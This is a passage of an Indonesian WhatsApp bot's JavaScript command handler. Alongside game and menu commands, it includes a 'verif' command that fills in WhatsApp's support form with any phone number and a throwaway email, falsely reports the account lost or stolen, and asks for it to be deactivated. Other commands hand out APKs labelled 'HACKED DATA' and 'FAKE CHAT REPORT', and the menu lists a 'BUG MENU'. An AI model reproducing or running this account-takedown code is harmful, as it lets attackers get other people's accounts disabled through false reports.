 if (isSapi < anu) return m.reply(`Kamu Tidak Memiliki Cukup Sapi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} cow 2\n 1 Cow = 10000 Money`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Sapi Mu:* ${getSapi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'gajah'){
 if (isGajah < anu) return m.reply(`Kamu Tidak Memiliki Cukup Gajah Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} elephant 2\n 1 Elephant = 15000 Money`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Gajahmu:* ${getGajah(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'besi'){
 if (isBesi < anu) return m.reply(`Kamu Tidak Memiliki Cukup Besi Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} iron 2\n 1 Iron = 15000 Money`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Besi Mu:* ${getBesi(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emas'){
 if (isEmas < anu) return m.reply(`Kamu Tidak Memiliki Cukup Emas Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} gold 2\n 1 Gold = 50000 Money`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emas Mu:* ${getEmas(m.sender)}`)
}, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return m.reply(`Kamu Tidak Memiliki Cukup Emerald Untuk Melanjutkan Transaksi Ini`)
 if (!args[1]) return m.reply(`Contoh : ${prefix + command} emerald 2\n 1 Emerald = 100000 Money`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
setTimeout( () => {
m.reply(`Transaksi Berhasil ✔️\n*Sisa uangmu* : ${getMonay(m.sender)}\n*Sisa Emerald Mu:* ${getEmerald(m.sender)}`)
}, 2000) 
 } else { m.reply("Incorrect Format!") }
 }
 break
 case 'heal':{
 if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
 if (!isCekDarah < 1) return m.reply('Kamu Hanya Bisa Menggunakannya Saat Darahmu 0')
 if (isCekDarah > 100) return m.reply('Darahmu Masih Full')
 if (isPotion < 1) return m.reply(`Kamu Tidak Punya Potion, Belilah dengan cara #buypotion _jumlah_`) 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 m.reply('Success! Darahmu Full Kembali')
 }
 break 
 case 'hunt': case 'hunting': case'berburu':{
 if (isBan) return m.reply(`Lah Lu Kan Di Ban`) 
if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (isCekDarah < 1) return m.reply('Your Blood Is Gone, Try To Heal Using Potions') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
let luka = ["Tertusuk Duri Saat Berburu","Terpleset Ke Jurang Saat Berburu","Tertangkap Hewan Buas","Tidak Berhati-hati","Terjerat Akar","Terjatuh Saat berburu"]
let location = ["Hutan","Hutan Amazon","Hutan Tropis","Padang Rumput","Hutan Afrika","Pegunungan"]
var ikanmu = Math.ceil(Math.random() * 10)
var ayam = Math.ceil(Math.random() * 8)
var kelinci = Math.ceil(Math.random() * 7)
var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)] 
var lukanya = luka[Math.floor(Math.random() * luka.length)]
var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan') {
 var image = './baseikal/gambarnye/rimba.jpg'
} else
 if (lokasinya === 'Hutan Amazon') {
 var image ='./baseikal/gambarnye/amazon.jpg'
} else
 if (lokasinya === 'Hutan Tropis') {
 var image = './baseikal/gambarnye/tropis.jpg'
} else
 if (lokasinya === 'Padang Rumput') {
 var image = './baseikal/gambarnye/padang_rumput.jpg'
} else
 if (lokasinya === 'Hutan Afrika') {
 var image = './baseikal/gambarnye/afrika.jpg'
} else
 if (lokasinya === 'Pegunungan') {
var image = './baseikal/gambarnye/pegunungan.jpg'
}
 setTimeout( () => {
let teksehmazeh = `_[ Hasil Berburu ]_\n`
teksehmazeh += `*🐟 Ikan* : ${ikanmu}\n`
teksehmazeh += `*🐔 Ayam* : ${ayam}\n`
teksehmazeh += `*🐇 Kelinci* : ${kelinci}\n`
teksehmazeh += `*🐑 Domba* : ${domba}\n`
teksehmazeh += `*🐄 Sapi* : ${sapi}\n`
teksehmazeh += `*🐘 Gajah* : ${gajah}\n\n`
teksehmazeh += `_[ INFO ]_\n`
teksehmazeh += `*Lokasi* : ${lokasinya}\n`
teksehmazeh += `*Luka* : ${lukanya}, Darah - 10\n`
teksehmazeh += `*Sisa Darah* : ${getDarah(m.sender)}\n`
 let buttons = [
 {
buttonId: `${prefix + command}`, 
buttonText: {
displayText: 'Berburu Lagi ️🏹'
 }, type: 1},
 ]
 let buttonMessage = {
 image: { url: image },
 caption: teksehmazeh,
 footer: pushname,
 buttons: buttons,
 headerType: 4
}
haikal.sendMessage(from, buttonMessage, { quoted: m }) 
}, 5000)
 setTimeout( () => {
m.reply(`${pushname} Mulai Berburu Di ${lokasinya}`)
}, 1000) 
 addIkan(m.sender, ikanmu) 
addAyam(m.sender, ayam) 
addKelinci(m.sender, kelinci)
addDomba(m.sender, domba)
addSapi(m.sender, sapi)
addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
// # BATAS # \\
//=================================================//
case 'owner': case 'crator':{
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
haikal.sendContact(m.chat, global.owner, m)
}
break
//=================================================//

case 'menu':{
let timestamp = speed()
let latensi = speed() - timestamp
touchmebree = [
{
title: `©️ 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚`,
rows: [
{title: `🌷 MENU`, rowId: `${prefix}pmenu`, description: ` 🔏 Loaadingg...
 `}, 
   {title: `🌷 BUG MENU`, rowId: `${prefix}pbugmenu`, description: ` 🔏 Loaadingg...
 `},
 {title: `🌷 ALL MENU`, rowId: `${prefix}pallmenu`, description: ` 🔏 Loaadingg...
 `},
{title: `🌷 TEXT MAKER`, rowId: `${prefix}ptextmaker`, description: ` 🔏 Loaadingg...
`},
{title: `🌷 MENU GAME`, rowId: `${prefix}pgame`, description: ` 🔏 Loaadingg...
`}
]
}
]
haikal.sendListMsg(m.chat, `

◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Status : ${isCreator ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Runtime Bot : ${runtime(process.uptime())}
Speed Bot : ${latensi.toFixed(4)} Detik

Semoga Kalian Suka 🥳`, haikal.user.name, `*INI ADALAH BOT ASLI INDONESIA*`, `Click Here 🌷`, touchmebree, m)
}
break

case 'pmenu': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let timestamp = speed()
let latensi = speed() - timestamp
m.reply( `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Status : ${isCreator ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Runtime Bot : ${runtime(process.uptime())}
Speed Bot : ${latensi.toFixed(4)} Detik

${menu}`)
 }
break
case 'pbugmenu': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let timestamp = speed()
let latensi = speed() - timestamp
m.reply( `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Status : ${isCreator ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Runtime Bot : ${runtime(process.uptime())}
Speed Bot : ${latensi.toFixed(4)} Detik

${bugmenu}` )
 }
break
case 'pallmenu': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let timestamp = speed()
let latensi = speed() - timestamp
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Status : ${isCreator ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Runtime Bot : ${runtime(process.uptime())}
Speed Bot : ${latensi.toFixed(4)} Detik

${allmenu}` )
 }
break
case 'ptextmaker': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let timestamp = speed()
let latensi = speed() - timestamp
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Status : ${isCreator ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Runtime Bot : ${runtime(process.uptime())}
Speed Bot : ${latensi.toFixed(4)} Detik

${textmaker}`)
 }
break
case 'pgame': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let timestamp = speed()
let latensi = speed() - timestamp
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Status : ${isCreator ? 'Owner' : 'User'}
Status Premium : ${isPrem ? 'Premium User' : 'Free User'}
Runtime Bot : ${runtime(process.uptime())}
Speed Bot : ${latensi.toFixed(4)} Detik
mentions: [sender]
${game}` )
 }
break
//=================================================/
case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
axios.get(`https://api.waifu.pics/sfw/waifu`)
.then(({data}) => {
haikal.sendImage(m.chat, data.url, mess.success, m)
})
break
case 'jadian': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!m.isGroup) throw groupon(from)
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
let buttonMessage = {
image: thumb,
caption: `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤
@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(m.chat, buttonMessage, {mentions: menst})
}
break

//=================================================//
case 'verif': {
if (!isPrem) return replyprem(mess.premium)
  var axioss = require ("axios")
  let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
haikal.sendMessage(m.chat, { text: util.format(res.data)}, { quoted:m })
}
break
//=================================================//
case 'sewa': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
maaf ga nyediain sewa kalau mau jadi bot bisa chat 𝘼𝙕𝙍𝙄𝙇 𝙞𝙣𝙫𝙞𝙨𝙞𝙗𝙡𝙚.me/6281214281312`)
}
break
//=================================================//

case 'soundbot': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

kal
ngakak
ketawa
awkwk
bang
nob
musik
mastah
slebew
cantik
kesel
santuy
makasih
oke
ngeselin`)
}
break

case 'apkhack': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AkPX3_pDzjXQZJ-c8-J3dvX8LkkuBnSKeIVYbTAqQj99.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "HACKED DATA.apk",
"fileSha256": "ubU38CumgrTjP8GEStOzR3cSKE9xs3XEwsTyfctHteo=",
"fileLength": "1827560",
"pageCount": 0,
"mediaKey": "v2sB68PUWb8xSia872KALjd+B75YR49jdfo3Jn9k4VY=",
"fileName": "HACKED DATA.apk",
"fileEncSha256": "ngqg7NXELMylExItJSx6yCR/WLvwgE30Uaz7ffHoFI8=",
"directPath": "/v/t62.7119-24/13763860_152939334171740_6756609789846514582_n.enc?ccb=11-4&oh=01_AdRZvTl3Xq_P81_gLahjaLXv7_mJaci-yB3IbHIrDhvlFA&oe=63E22966",
"mediaKeyTimestamp": "1673183311",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim Apk Hack 
Versi Code : 1
Size: 1.74M
Versi       : 1.0
Packages   : com.KingPOD
Tanda Tangan : V1
`)
}
break


case 'drawany': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AklJg686fzI63k4lbOZgvMaLcuxKQZ1NSAW7O02aqawv.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "DrawAnyWhere_4.3.5.apk",
"fileSha256": "cjySNM1YyrZbA2tAoetGiPqU7XBzqpks+5Y2SRTjMcg=",
"fileLength": "2009356",
"pageCount": 0,
"mediaKey": "HX2pvy38n9X0ujV4+SYemjWw2niMxp4MIZqrPdEppbU=",
"fileName": "DrawAnyWhere_4.3.5.apk",
"fileEncSha256": "QDqHaBRpJ/fLIyMNgzVWjVVN2/5pjnofi1CSzjVES7E=",
"directPath": "/v/t62.7119-24/30957615_1511635945979743_5505496555941343278_n.enc?ccb=11-4&oh=01_AdTZ49WMm8qqcOPsZYih0CGlC30xDjTpOckfyHhWomAY8g&oe=63E2480F",
"mediaKeyTimestamp": "1673182527",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim Apk
Versi Code : 32
Size: 1.92M
Versi       : 4.3.5
Packages   : com.mlwrkz.drawanywhere
Tanda Tangan : V1 + V2
`)
}
break



case 'drawany1': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlMM1DkKHYH55ERlK5b8T-cpbuGTEvd1S8Q25cnVBcyW.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Ascii Art_4.0.4.apk",
"fileSha256": "M+2NfEbgTJPO0WVBIYU1/6Wc/v7pw2XTsCZBrQbLdzk=",
"fileLength": "3466685",
"pageCount": 0,
"mediaKey": "3pE02PDFQJ8V73OraB3sJVNCSgQk9HCfaeqBGY5ITq4=",
"fileName": "Ascii Art_4.0.4.apk",
"fileEncSha256": "at/92MJZp856mqiwp+scL0CiJ9RhJ36+So6w3fhyLRY=",
"directPath": "/v/t62.7119-24/35201011_1354414975318864_8414635329800543416_n.enc?ccb=11-4&oh=01_AdQi7TD1lhrqskdiiWfMTg4lpCWJXF0bprYyY5kXGm43_g&oe=63E221F7",
"mediaKeyTimestamp": "1673182527",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim Apk
Versi Code : 404
Size: 3.31M
Versi       : 4.0.4
Packages   : com.duy.asciiart
Tanda Tangan : V1 + V2
`)
}
break


case 'drawany2': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqrqODyWUVMT_RcTxIK9SHnOAh2veq1ubsWvJet3zoGv.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "APK Editor_3.0.apk",
"fileSha256": "6f8mXks3saLFgQYBvycLn1bRDM0/FEnxxmwK7Q+bpXY=",
"fileLength": "5528152",
"pageCount": 0,
"mediaKey": "eBOaFSzeSU4ZmnGZuXs5SfRYKizhO+XW/AekUiXcij4=",
"fileName": "APK Editor_3.0.apk",
"fileEncSha256": "8i68nLN0qJ7WPbt2QdTsTcD8HRdGw0c+CuY1NgK0WFw=",
"directPath": "/v/t62.7119-24/30024119_2472137919604014_2433576390214876562_n.enc?ccb=11-4&oh=01_AdQ9HjFuka0LVhusUvcr8swpOSmqQoRrOqAoP9LBpH6TzQ&oe=63E2290B",
"mediaKeyTimestamp": "1673182527",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim Apk
Versi Code : 300
Size: 5.27M
Versi       : 3.0
Packages   : com.gmail.heagoo.apkeditor.pro
Tanda Tangan : V1 + V2 + V3
`)
}
break

case 'drawany3': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AovKeLfmxDfnq1N4wnXZqYhht7eDWW1IJzBU892qt4-w.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "MT Manager_2.11.3.apk",
"fileSha256": "8MVrLc1vQHhGjRmeoxtsja11AXW0H/WTq/noKp+FF/o=",
"fileLength": "19646480",
"pageCount": 0,
"mediaKey": "E+JoXBl2rW0ZZXno4FTi07CMeZ+0tj4MymCOQhDdT2A=",
"fileName": "MT Manager_2.11.3.apk",
"fileEncSha256": "58M7+bXYn2WfYISmU5xrp+jjYyT90xRCrPotBhwysrE=",
"directPath": "/v/t62.7119-24/29231642_217221087373927_1255336424081941846_n.enc?ccb=11-4&oh=01_AdTlpDi0w3wwiBsZHhvizOERjbvNakpI9x_lEJwEBTYHOw&oe=63E21A47",
"mediaKeyTimestamp": "1673182527",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim Apk
Versi Code : 22071591
Size: 18.74M
Versi       : 2.11.3
Packages   : bin.mt.plus
Tanda Tangan : V1 + V2
`)
}
break


case 'wonggbb': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/ApXbcz1gxrI6p55OfAM-ZrQkxfM23L5OdUwIoChfI6EI.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "GBWA+FAKE CHAT REPORT.apk",
"fileSha256": "5p+kjZtCblhSwD4PI8alhuaU7Ef7bR/mz2VEk9yJSyU=",
"fileLength": "61592469",
"pageCount": 0,
"mediaKey": "XOYtOKs7931zEwF5jSzU+QUoWW6h3FglrHambltnvDc=",
"fileName": "GBWA.apk",
"fileEncSha256": "l8qUD/DxduackJL+aVBy/lhDrmVI68/Lhch+X0VhUzo=",
"directPath": "/v/t62.7119-24/31979775_547821587361656_1119496716832352749_n.enc?ccb=11-4&oh=01_AdSP1OHQIt_exuK06AYY1j-UdFVk3-NHfgALuCGkql1bVg&oe=63E21F07",
"mediaKeyTimestamp": "1673181141",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size: 58.74M
Versi Wa   : 2.22.17.76
Packages   : com.gbwhatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break


case 'wonggb': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AnyLA2cmhJyWHBvJRf0O1mnYNFMbru2AXb9WrGVk0A1Z.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Fix GBWhatsApp_2.22.23.77.apk",
"fileSha256": "orFUyKb7toZfE0T6fBIl56h3AI1Q/Yw6/VJVDox8w48=",
"fileLength": "62057577",
"pageCount": 0,
"mediaKey": "0zCmtzm2+v7r7mqdAmqQ2YSiLy9CixpEoW0q1+dNgLs=",
"fileName": "Fix BWhatsApp_2.22.23.77.apk",
"fileEncSha256": "JW81e8yD8yRoNV/dMB7m3hr9o/aWfEad0CAE66dOwDs=",
"directPath": "/v/t62.7119-24/35261867_631466192085771_3320560928032684188_n.enc?ccb=11-4&oh=01_AdRMM2krCyNqxruyk2MhiJkGde6VlEXPJUqN6KZ4RO544g&oe=63DE076F",
"mediaKeyTimestamp": "1672903280",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size: 59.18M
Versi Wa   : 2.22.23.77
Packages   : com.gbwhatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break
case 'wonggb1': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Au9ttoukIuYGJHDDVhMEWynwfMbA0I25TuEt-6VXaIBJ.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Fix GBWhatsApp_2.22.23.77_[com.hwmodswa].apk",
"fileSha256": "RINlspgKYPFwow9txHRyvmTVE1naSeEP7tiBRaVgocg=",
"fileLength": "62004337",
"pageCount": 0,
"mediaKey": "KCYRg9ga6W+ucscnud404KVMBQgPb3Torka5gKwZxqQ=",
"fileName": "Fix GBWhatsApp_2.22.23.77_[com.hwmodswa].apk",
"fileEncSha256": "Mz4AumgNwH8PAEYfudoNvsMurd5aV3HD6wDgxjGdAVY=",
"directPath": "/v/t62.7119-24/29336596_492043203071081_6910390125030767965_n.enc?ccb=11-4&oh=01_AdTxzAaHnuX8SwuHtmmvqeTIzMMlyyL4oTSqp8801dQquA&oe=63E2438D",
"mediaKeyTimestamp": "1673181587",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size: 58.74M
Versi Wa   : 2.22.17.76
Packages   : com.hwmodswa
Tanda Tangan : V1 + V2 + V3
`)
}
break

case 'wonggb2': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AoOuBafurPVmYtwlGihGWbUVvUniEAJ0WYblt2tQKenR.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Fix GBWhatsApp_2.22.23.77_[com.hwwhatsapp].apk",
"fileSha256": "2yIDjRuRKFZKeLmMzXH+CbGR9GCRAjf5zy5ksNsuzQ0=",
"fileLength": "62004338",
"pageCount": 0,
"mediaKey": "qFWirI+1LvxWjoQ9CuOGdt25FywyGwq9FeMeJfXiJy8=",
"fileName": "Fix GBWhatsApp_2.22.23.77_[com.hwwhatsapp].apk",
"fileEncSha256": "e8zq+b92Mid4kqqyHjQqTvn8kSZai3PXfg0j5hAZ/do=",
"directPath": "/v/t62.7119-24/21582267_234176845613728_4154839308800527485_n.enc?ccb=11-4&oh=01_AdT48UUWQhBkm6BpgHMR3PyvUQu_5CE1W_GLZS-Jma_7wg&oe=63E227C7",
"mediaKeyTimestamp": "1673181942",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size: 59.18M
Versi Wa   : 2.22.23.77
Packages   : com.hwwhatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break
case 'wonggb3': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AvvsiskTlOschzcEV-n8Empd-D8rTQS-udZyqDDcAmjs.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Fix GBWhatsApp_2.22.23.77_[com.wago].apk",
"fileSha256": "7s8HyZWnR/1UhXbnzz1FAMVCzCKzJah0MBXSKbovjFE=",
"fileLength": "61992052",
"pageCount": 0,
"mediaKey": "cZ2KbQP9oLb5+LB+xsAPCk4ugXY095C4+nuKIVqVYZ4=",
"fileName": "Fix GBWhatsApp_2.22.23.77_[com.wago].apk",
"fileEncSha256": "cRwxyP6wpe9g3gh8oTxFyRH+8+chSXj5cZnYsyhcWn4=",
"directPath": "/v/t62.7119-24/40697900_1132286054114597_6407413577873705490_n.enc?ccb=11-4&oh=01_AdS6JwsUp3cd1pH8Qi_nFaUOYF0US2HeGms9-OaiOF3eew&oe=63E21CC8",
"mediaKeyTimestamp": "1673062140",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size: 59.18M
Versi Wa   : 2.22.23.77
Packages   : com.wago
Tanda Tangan : V1 + V2 + V3
`)
}
break

case 'wonggb4': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Arl_PeGyn9cA4WwergChqs-ai7RxJgcmn51lygZMSFLw.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Fix GBWhatsApp_2.22.23.77_[com.whatsapp].apk",
"fileSha256": "oD2F2McuaTuHLHM24qwrBUxzZPT0nuw0Ffgt/zM6Iis=",
"fileLength": "62000240",
"pageCount": 0,
"mediaKey": "KY+yHyslMUGzPPLwgc+bRHvf/XoKdOV8w0cZh2Naht8=",
"fileName": "Fix GBWhatsApp_2.22.23.77_[com.whatsapp].apk",
"fileEncSha256": "sGUEsIGepkr7U9526ie0CtgjB1o6IeQLoTTbVulGQ7Y=",
"directPath": "/v/t62.7119-24/33538326_4570455823079139_5863659581296623888_n.enc?ccb=11-4&oh=01_AdTGp3LzY8rK87kWiUw3XCvsQKVgrMz40JYtaWTrZTA9iA&oe=63E21DD7",
"mediaKeyTimestamp": "1673181942",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 2139210154
Size: 59.18M
Versi Wa   : 2.22.23.77
Packages   : com.whatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break

case 'hwcap': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AlClDGiDLNkIQFVxIQ-kAGZ8vOp63lrN2AkoKDeRNRL9.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.gbwhatsapp.apk",
"fileSha256": "s13/oODB78/58X257unjAwsXf4LLeULGp/l++c+uu7w=",
"fileLength": "43515737",
"pageCount": 0,
